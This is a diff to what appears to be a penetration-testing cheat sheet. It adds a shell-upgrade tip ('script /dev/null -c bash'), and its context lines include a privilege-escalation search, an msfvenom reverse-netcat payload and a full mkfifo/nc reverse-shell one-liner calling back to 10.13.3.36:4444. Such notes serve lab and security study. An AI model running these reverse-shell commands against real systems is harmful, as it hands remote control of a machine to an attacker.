@@ -14,7 +14,7 @@
     * `getcap -r / 2>/dev/null`
 
 
-## Generate reverse ncat
+## Generate reverse netcat
 * `msfvenom -p cmd/unix/reverse_netcat lhost=10.13.3.36 lport=4444`
     * `mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`
 * Bash Reverse Shell
@@ -74,6 +74,12 @@ speed 38400 baud; rows 53; columns 211; line = 0;
 Then in the reverse shell:
 ```bash
 stty rows 53 cols 211
+```
+
+If python is not on the server:
+
+```bash
+script /dev/null -c bash
 ```
 
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
